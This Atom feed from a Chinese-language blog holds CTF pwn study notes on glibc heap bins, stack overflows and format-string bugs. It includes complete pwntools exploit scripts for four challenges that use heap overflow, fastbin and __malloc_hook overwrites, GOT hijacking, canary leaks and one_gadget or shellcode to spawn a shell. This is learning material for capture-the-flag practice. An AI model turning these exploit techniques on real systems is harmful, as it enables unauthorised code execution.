<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-12T12:36:33.355Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>changyangr</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>重新做人之-pwn-堆溢出</title>
    <link href="http://example.com/2021/10/29/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    <id>http://example.com/2021/10/29/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E5%A0%86%E6%BA%A2%E5%87%BA/</id>
    <published>2021-10-29T09:43:24.000Z</published>
    <updated>2021-11-12T12:36:33.355Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><pre><code>[堆中的各种 bin 的介绍即漏洞利用](https://blog.csdn.net/A951860555/article/details/115507124)[堆中 各种 bin 详解 ](https://blog.csdn.net/A951860555/article/details/115507124)</code></pre><h3 id="自我理解"><a href="#自我理解" class="headerlink" title="自我理解"></a>自我理解</h3><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4> <font color="red"><pre><code>何时使用：  当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。（libc-2.26之后要填满tcache）目的：      这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。Unsorted bin的特性如下：        unsorted bin的个数： 1个。        unsorted bin是一个由free chunks组成的循环双链表。        在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。        unsortedbin采用的遍历顺序是FIFO。        当第一个 chunk 进入 unsorted bin 中时，其 fd 和 bk 指针会指向 偏移 main_arena 不远处。        (main_arena 的地址 与libc_base的地址的偏移是固定的 而 libc_base 的地址可以通过 vmmap 查看)</code></pre> </font><h4 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h4> <font folor="#49b1f5"><pre><code>概念：chunk的大小在32字节~128字节（0x20~0x80）的chunk称为“fast chunk”（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员）。    fast bin链表的个数为10个。(每个链表为一个数组，最多储存 10个)每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作。(即后进入的先分配)首个进入 fast bin链表的chunk 的 fd 指针 为空，尔后，每个chunk 的fd 指针指向链表中的前一个 chunk。每一次 free main_arena 直接指向被 free 的chunk。</code></pre><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="buu-babyheap-0ctf-2017"><a href="#buu-babyheap-0ctf-2017" class="headerlink" title="buu - babyheap_0ctf_2017"></a>buu - babyheap_0ctf_2017</h3> <font color="red">    一道简单的堆题，但是对我来说依旧很难。    题目 漏洞：fill 函数存在漏洞，不检查你输入的大小时否溢出，即是否大于当前堆块的大小。    做题思路 ：        可以利用 fill 函数修改 fast bin链表，使得还在使用的 chunk(大小必须满足 unsorted bin) 加入到 fast bin数组中，再次申请一个大小等于该chunk 的chunk，这样就有了两个指针指向同一个chunk。        free 该chunk，然后dump 该chunk，就能泄露出 main_arena 的地址。再次修改 fast bin 链表，使得我们的 fake chunk 能够被创建在 malloc_hook 的不远处。写入 ogg 来 get shell。 </font> <font color="#49b1f5"> <table><tr><td bgcolor="black">    exp：     from pwn import *    context.log_level="debug"<pre><code>#sp=remote(&#39;node4.buuoj.cn&#39;,25667)p=process(&#39;./heap&#39;)def allocate(size):    p.recvuntil(&#39;Command: &#39;)    p.sendline(&#39;1&#39;)    p.recvuntil(&#39;Size: &#39;)    p.sendline(str(size))def fill(idx,content):    p.recvuntil(&#39;Command: &#39;)    p.sendline(&#39;2&#39;)    p.recvuntil(&#39;Index: &#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Size: &#39;)    p.sendline(str(len(content)))    p.recvuntil(&#39;Content: &#39;)    p.send(content)def free(idx):    p.recvuntil(&#39;Command: &#39;)    p.sendline(&#39;3&#39;)    p.recvuntil(&#39;Index: &#39;)    p.sendline(str(idx))def dump(idx):    p.recvuntil(&#39;Command: &#39;)    p.sendline(&#39;4&#39;)    p.recvuntil(&#39;Index: &#39;)    p.sendline(str(idx))    p.recvline()    return p.recvline()def debug():    gdb.attach(p)    pause()allocate(0x10)    #0allocate(0x10)    #1allocate(0x10)    #2allocate(0x10)    #3allocate(0x80)    #4free(1)free(2)#gdb.attach(p)payload = p64(0) * 3payload += p64(0x21)payload += p64(0) * 3payload += p64(0x21)payload += p8(0x80)fill(0,payload)#gdb.attach(p)payload = p64(0) * 3payload += p64(0x21)fill(3,payload)#gdb.attach(p)allocate(0x10)    #1allocate(0x10)    #2fill(1,&#39;aaaa&#39;)fill(2,&#39;bbbb&#39;)payload = p64(0) * 3payload += p64(0x91)fill(3,payload)allocate(0x80)    #5free(4)libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78junk=libc_base+0x3c4b78log.info(&quot;junk: &quot;+hex(junk))log.info(&quot;libc_base: &quot;+hex(libc_base))#debug()allocate(0x60)    #4free(4)payload = p64(libc_base+0x3c4aed)   #0x3c4aed 为找到的用于创建 fake_chunk 的地址，找到的地址必须得符合chunk size的要求。fill(2, payload)allocate(0x60)    #4allocate(0x60)    #6#debug()payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4527a) #0x4527a为 ogg 的地址fill(6, payload)#gdb.attach(p)allocate(255)p.interactive()</code></pre> </td></tr></table>    找到的 fake_chunk 的地址 如图：     ![](1.png)    000000007f 满足 chunk size 0x71 的大小要求。 </font><h3 id="ctfwiki-plaidctf-2015-plaiddb"><a href="#ctfwiki-plaidctf-2015-plaiddb" class="headerlink" title="ctfwiki- plaidctf 2015 plaiddb"></a>ctfwiki- plaidctf 2015 plaiddb</h3> <font color="red"><p> 大佬们都太强了，构思真的十分巧妙。我从中学到了 许多。<br> 虽然是一个 off by one 漏洞，但其实我并没有发现 哪里使用了该漏洞。。。<br> 个人 认为主要是 利用了 DEL 函数 会先创建一个 chunk ，然后再去 free ，而这个 chunk 里的值我们是可以随意填的，其大小 也为 0x20 依次乘 2<br> 直接贴上 exp 吧：<br> </p></font><br> <font color="#49b1f5"><br> <table><tr><td bgcolor="black"><br>#! /usr/bin/env python2<p></p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><h1 id="vim-fenc-utf-8"><a href="#vim-fenc-utf-8" class="headerlink" title="vim:fenc=utf-8"></a>vim:fenc=utf-8</h1><p>import sys<br>import os<br>from pwn import *<br>context(os=’linux’, arch=’amd64’, log_level=’debug’)</p><p>p=process(‘./dat’)</p><p>libc = ELF(‘/home/boy/downloads/pwn-change-libc-main/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so’) </p><p>def cmd(command_num):<br>    p.recvuntil(‘command:’)<br>    p.sendline(str(command_num))</p><p>def put(key, size, data):<br>    cmd(‘PUT’)<br>    p.recvuntil(‘key:’)<br>    p.sendline(key)</p><pre><code>p.recvuntil(&#39;size:&#39;)p.sendline(str(size))p.recvuntil(&#39;data:&#39;)if len(data) &lt; size:    p.send(data.ljust(size, &#39;\x00&#39;))else:    p.send(data)</code></pre><p>def delete(key):<br>    cmd(‘DEL’)<br>    p.recvuntil(‘key:’)<br>    p.sendline(key)</p><p>def get(key):<br>    cmd(‘GET’)<br>    p.recvuntil(‘key:’)<br>    p.sendline(key)<br>    p.recvuntil(‘[‘)<br>    num = int(p.recvuntil(‘ bytes’).strip(‘ bytes’))<br>    p.recvuntil(‘:\n’)<br>    return p.recv(num)<br>def debug():<br>    gdb.attach(p)<br>    pause()</p><p>def main():<br>    # avoid complicity of structure malloc</p><pre><code>for i in range(10):    put(str(i), 0x38, str(i))                                  # 相关函数实现的时候用到了一些0x38大小的块，避免影响我们提前搞一些            for i in range(10):    delete(str(i))# allocate what we want in orderput(&#39;1&#39;, 0x200, &#39;1&#39;)put(&#39;2&#39;, 0x50, &#39;2&#39;)put(&#39;5&#39;, 0x68, &#39;6&#39;)put(&#39;3&#39;, 0x1f8, &#39;3&#39;)put(&#39;4&#39;, 0xf0, &#39;4&#39;)put(&#39;defense&#39;, 0x400, &#39;defense-data&#39;)    # free those need to be freed         #切割 空闲 chunk 时的顺序： unsorted bin &gt; 其他bin 而如果 有fast bin 满足需求，则先用fast bindelete(&#39;5&#39;)delete(&#39;3&#39;)delete(&#39;1&#39;)delete(&#39;a&#39; * 0x1f0 + p64(0x4e0))      #溢出，4e0=0x200+0x50+0x68+0x1f8+0x30 原理： 堆块的 pre size 位，如果该 chunk 正在使用，则用来储存上一                         delete(&#39;4&#39;)                           chunk 的内容，如果 该 chunk 空闲，则用来记录 上一 (空闲) chunk 的size，这里覆盖 pre size 位位0x4e0，put(&#39;0x200&#39;, 0x200, &#39;fillup&#39;)         再 free 掉该 chunk ，从而让以上 0x4e0 空间 被 free 掉。然而实际上 有指针指向 被 free 的空间，从而利用 unsorted bin 泄露 libc。put(&#39;0x200 fillup&#39;, 0x200, &#39;fillup again&#39;)  #填充完 后， chunk 2 即为 unsorted bin 中的 第一个 chunk 所以 其 fd 和 bk 指针都指向偏移 main_arena 不远处。 libc_leak = u64(get(&#39;2&#39;)[:6].ljust(8, &#39;\x00&#39;))log.info(&#39;libc leak: 0x%x&#39; % libc_leak)libc_base = libc_leak - 0x3c4b78p.info(&#39;libc_base: 0x%x&#39; % libc_base)put(&#39;fastatk&#39;, 0x100, &#39;a&#39; * 0x58 + p64(0x71) + p64(libc_base + libc.symbols[&#39;__malloc_hook&#39;] - 0x10 + 5 - 8)) #伪造一个 fast bin 里的 chunk，经 debug 调试发现，put(&#39;prepare&#39;, 0x68, &#39;prepare data&#39;)                                                                            如果满足 fast bin 里的 chunk 构造 规则，即能够被识别为one_gadget = libc_base + 0x4527a                                                                                fast bin 里的 空闲 chunk。p.info(&#39;ogg_addr: &#39;+hex(one_gadget))put(&#39;attack&#39;, 0x68, &#39;a&#39; * 3 + p64(one_gadget))debug()p.sendline(&#39;DEL&#39;) # malloc(8) triggers one_gadgetp.interactive()</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p></td></tr></table></font></font>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pwn 出现  Got EOF while reading in interactive 报错</title>
    <link href="http://example.com/2021/10/29/pwn-Got-EOF-while-reading-in-interactive/"/>
    <id>http://example.com/2021/10/29/pwn-Got-EOF-while-reading-in-interactive/</id>
    <published>2021-10-29T08:54:33.000Z</published>
    <updated>2021-10-29T09:17:48.073Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="pwn-出现-Got-EOF-while-reading-in-interactive-报错"><a href="#pwn-出现-Got-EOF-while-reading-in-interactive-报错" class="headerlink" title="pwn 出现  Got EOF while reading in interactive 报错"></a>pwn 出现  Got EOF while reading in interactive 报错</h2> <font face="黑体" color="#49b1f5" size="5"><p> 出现Got EOF while reading in interactive 的报错，就我目前为止，所遇到的，有 3 情况 :</p><ol><li>地址错误，导致没有 get shell；</li></ol></font><font color="red">地址错误的话，需要查看 libc 的版本是否是对的。一般来说 远程打不通，本地能通都是这个问题。推荐下一个 LibcSearcher ,虽然有 libc database search 网站可以查阅，但网站了里面的 libc 似乎是不全的。或则直接就是 你的地址没有找对。建议 现在本地尝试一下。 本地的 libc 加载地址是不变的。当然堆题 需要利用 libc 漏洞的话，就不建议了。 </font> <font face="黑体" color="#49b1f5" size="5"><ol start="2"><li>栈没有对齐。</li></ol></font><font color="red">栈没有对齐一般是因为 Ubuntu18.04 64位 和 部分 Ubuntu16.04 64位 调用 system 的时候，rsp 的最低字节必须为 0x00（栈以16字节对齐），否则无法运行 system 指令。<p> 要解决这个问题，只要将返回地址设置为跳过函数开头的 push rbp 就可以了。(加 ret 也同样好使。)<br> 有时候也可能是因为 ret 而导致的不能 get shell 。 有时候 ret 为奇数能 get shell ，为偶数不能。 反之亦然。<br> 所以遇到这种情况多试试就行了。<br> </p></font><p></p> <font face="黑体" color="#49b1f5" size="5"><ol start="3"><li>没有返回地址。</li></ol> </font> <font color="red"><p> 没有返回地址一样可能会造成 错误而无法 get shell。 加上就行  如：  p64(0xdeadbeef) 和 p32(0)<br> </p></font><p></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>重新做人之 pwn 栈溢出</title>
    <link href="http://example.com/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://example.com/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2021-10-28T06:27:45.000Z</published>
    <updated>2021-10-29T09:31:43.528Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2> <font color="red"><p> 函数状态主要涉及三个寄存器－－esp，ebp，eip。<br> esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。<br> ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<br> eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p><p> 这是一个栈：<br> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/zhan.jpg"><br> caller: 调用函数<br> callee: 被调用函数<br> 我们通过函数向栈里面写入的数据应是从 argn 开始，一路写进去，最后覆盖 callee 的 return address。<br> 所以一般的 payload= padding + (ebp) + (eip)<br> ebp 的覆盖一般来说可以任意。</p> </font><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="格式化字符串介绍"><a href="#格式化字符串介绍" class="headerlink" title="格式化字符串介绍"></a>格式化字符串介绍</h3> <font color="red"><pre><code>格式化字符串是一个使 printf 类函数 错误的漏洞，虽然利用方法（对我来说）较难，但是利用方式却多样。</code></pre> </font> <font color="Blue">  <p> 格式化字符串 漏洞 ：<br>    %x : 输出一个16进制数，前面没有 0x<br>    %p : 输出一个16进制数，前面带有 0x （一般来说，使用 %p 来泄露地址）<br>    %c : 写入一个字符，用来填充字符 如 %13c，经 printf 识别，就会写入13个字符。 劫持 got 表时，需要用到。<br>    %s : 输出一个字符串。 可以用来泄露地址。<br>    %n : 写入一个数字，且为已写入字符的数量，配合 %c 修改地址。<br>    （除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。）</p> </font> <font face="黑体" color="red" size="5"><p> 32位是通过堆栈传参<br> 64位是通过寄存器+堆栈传参，顺序依次是：rdi、rsi、rdx、rcx、r8、r9（edi、esi、edx、ecx、r8、r9）<br> 注意：<br> 我们向栈里写入的数据是先存放在栈上，后通过 printf 识别，再输出的。所以 本身的 %p 之类被识别的指令，也是会在栈上占据位置。 </p> </font> <font color="green"><p> 32位 格式化字符串漏洞的 got表 劫持：<br> offset = 5<br> payload=p32(got)+’%’+str(system-4)+’c%5$n’ 将got里存放的地址写为system的 地址。</p><p> 也可以这么写：<br> offset = 5<br> payload=p32(got)+p32(got+1)+p32(got+2)+p32(got+3)<br> payload+=’%’+str()+’c%5$hhn’<br> payload+=’%’+str()+’c%6$hhn’<br> payload+=’%’+str()+’c%7$hhn’<br> payload+=’%’+str()+’c%8$hhn’<br> 依照位次而定，每一个覆盖是2位。（因为无论是32位或是64位 汇编，都是小端序，所以需要倒着写）</p> </font> <font color="red"><p> 64位 格式化字符串漏洞的 got表 劫持：</p><p> 64位是通过寄存器+堆栈传参，顺序依次是：rdi、rsi、rdx、rcx、r8、r9（edi、esi、edx、ecx、r8、r9）</p><p> offset=6    一般情况下偏移为 6 或 7</p><p> 由于64位下用户可见的内存地址高位都带有\x00(64位地址共16个16进制数)，而 \x00 是字符串结束符。<br> 所以 应把要改 的 got表地址 放在后面，且不能用%hhn 分段写。<br> 如：<br> payload=’a%’+str(system-1)+’c%8$lln’+p64(got)     加 a 是为了使得数据在栈上对齐。</p> </font><h3 id="例题：mid-canary"><a href="#例题：mid-canary" class="headerlink" title="例题：mid-canary"></a>例题：mid-canary</h3> <font color="red"> libc 为 libc-2.23.11.3 checksec 使用带 canary 的64位 elf 程序。 一个一轮游的 格式化字符串漏洞。 <p> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/ca1.png"></p><p> 因为只走一轮，且有 canary 所以肯定不能够直接拿到shell。</p><p> 只有 劫持 stack_chk_fail 函数为 main 函数。</p><p> 在输入之后，输出之前下断点查看寄存器的值。<br> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/ca2.png"></p><p> 发现 rcx 里的存放着 write_nocancel+7 的值,而 write_nocancel 为调用write 需要调用的函数，且彼此之间的偏移是固定的。</p><p> 所以我们只需要泄露出 rcx 的值就可以计算出 write_addr ，从而泄露出 libc 的偏移。</p><p> 而 rcx 为64位 传参的第4位，但是 经过测试 发现 偏移为 3 ，即 %3$p 能泄露出地址。</p><p> exp 逻辑： 利用 printf 修改 stack_chk_fail 的got表的地址 为 main 函数，故意触发 stack_chk_fail 返回 main 函数，再次利用 printf 拿到 write_nocancel+7 的地址。最后利用 ogg 拿到shell。</p><p> 所以 exp 如下：<br> </p></font><br> <font color="white"><br> <table><tr><td bgcolor="black"><br> from pwn import *<br> from LibcSearcher import *<p></p><p> def debug():<br>    gdb.attach(io)<br>    pause()<br> context.log_level = ‘debug’<br> io = process(“./ca”)<br> elf=ELF(“ca”)<br> ogg=[0x45226,0x4527a,0xf03a4,0xf1247]<br> check_fail=elf.got[‘__stack_chk_fail’]<br> write_got=elf.got[‘write’]<br> print(hex(write_got))<br> main_addr=0x00400737</p><p> payload=’a%’+str(main_addr-1)+’c%8$lln’<br> payload+=p64(check_fail)<br> payload=payload.ljust(0x118,’a’)</p><p> #payload=’aaab%7$s’+p64(write_got)</p><p> io.recvuntil(“What is your name: “)<br> io.sendline(payload)<br> debug()<br> io.recvuntil(“Hello “)<br> junk1=io.recv(16)<br> print(junk1)</p><p> #io.recvuntil(“aaab”)<br> #canary=u64(io.recv(18).ljust(8,’\x00’))<br> #canary=int(io.recvuntil(‘0x’,drop=True),16)-240  不用泄露 canary。而且 canary被覆盖住了，泄露不出来。</p><p> io.recvuntil(“What is your name: “)<br> exploit=’aaab’+’%3$p’</p><p> exploit=exploit.ljust(0x118,’a’)<br> io.sendline(exploit)<br> io.recvuntil(“Hello “)<br> io.recvuntil(‘ab’)</p><p> junk=int(io.recv(14),16)-0x10</p><p> #junk=u64(io.recv(6).ljust(8,’\x00’))</p><p> libc=LibcSearcher(‘write’,junk)<br> print(hex(junk))</p><p> base=junk-libc.dump(‘write’)<br> ogg_addr=ogg[0]+base</p><p> payload=’a’*0x118+p64(ogg_addr)   </p><p> io.recvuntil(“What is your name: “)<br> io.sendline(payload)<br> io.interactive()</p> </td></tr></table></font><h3 id="ez-ret3"><a href="#ez-ret3" class="headerlink" title="ez_ret3"></a>ez_ret3</h3> <font color="#49b1f5"> 保护全开的64位elf文件。 <p> 值得注意的是，这个文件也是一个格式化字符串漏洞，同时，在 rcx 的位置放了 read__nocancel+7 ,可能是 libc 的原因？<br> 栈上也有 libc_start_main 的地址，这里泄露 read_nocancel+7 的地址。</p><p> 麻烦的点在于 pie 绕过 ，开启了 pie 后 data段、 text段、 bss段 的地址都会产生偏移，无法用 elf 的操作去得到地址。<br> 但是 地址的后三位是不变的，同时我们只能输入 2 的整数倍的字节数，所以一开始的想法是 爆破第4位。可是换了远程使用的 libc 后，就没有成功过。本地倒是能行。</p><p> exp 逻辑： 首先通过格式化字符串漏洞 拿到 canary 的值，通过覆盖 \x00 返回 main 函数，通过 printf 泄露 read_nocancel+7 地址，最后利用 ogg 拿到 shell<br> 标准 exp 是覆盖 \x00 不太明白。</p><p> exp 如下：<br> </p></font><p></p> <table><tr><td bgcolor="black"> <font color="white"><p> #coding=utf-8<br> from pwn import *<br> context(log_level = ‘debug’, arch = ‘amd64’, os = ‘linux’)</p><p> def debug():<br>    gdb.attach(io)<br>       pause()</p><p> #io = remote(“39.103.198.196”,’10009’)<br> main=0x00000009ED<br> ogg=[0x45226,0x4527a,0xf03a4,0xf1247]<br> io = process(‘./tang’)<br> #io = remote(“39.103.198.196”,’10009’)<br> elf=ELF(‘tang’)<br> libc=ELF(“/home/boy/downloads/pwn-change-libc-main/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so”)<br> payload=’%9$p’<br> shellcode=’a’*(0xbca-0xb78)<br> print(0xbca-0xb78)<br> shellcode+=asm(shellcraft.sh())<br> xx=io.recvline()<br> io.sendline(payload)<br> #debug()<br> canary=int(io.recv(18),16)<br> print(hex(canary))<br> #canary=u64(canary)<br> io.recvline()<br> sleep(0.1)<br> io.recvline()<br> io.sendline(shellcode)<br> junk=io.recvline()<br> print(junk)<br> #list1 =<br>  [‘\x09’,’\x19’,’\x29’,’\x39’,’\x49’,’\x59’,’\x69’,’\x79’,’\x89’,’\x99’,’\xa9’,’\xb9’,’\xc9’,’\xd9’,’\xe9’,’\xf9’]<br> exploit=’a’*0x38+p64(canary)+’a’*0x18+’\x00’<br> #debug()<br> sleep(0.1)<br> #debug()<br> io.send(exploit)<br> io.send(‘a%3$p’)<br> io.recvuntil(‘a’)<br> write_addr=int(io.recv(14),16)+0x50<br> print(hex(write_addr))<br> base=write_addr-libc.symbols[‘write’]<br> ogg_addr=base+ogg[3]<br> payload=’a’*0x38+p64(canary)+’a’*0x10+’a’*0x8+p64(ogg_addr)<br> io.recvline()<br> io.sendline(shellcode)<br> junk=io.recvline()<br> print(junk)<br> io.sendline(payload)<br> io.interactive()</p> </font></td></tr></table> ]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
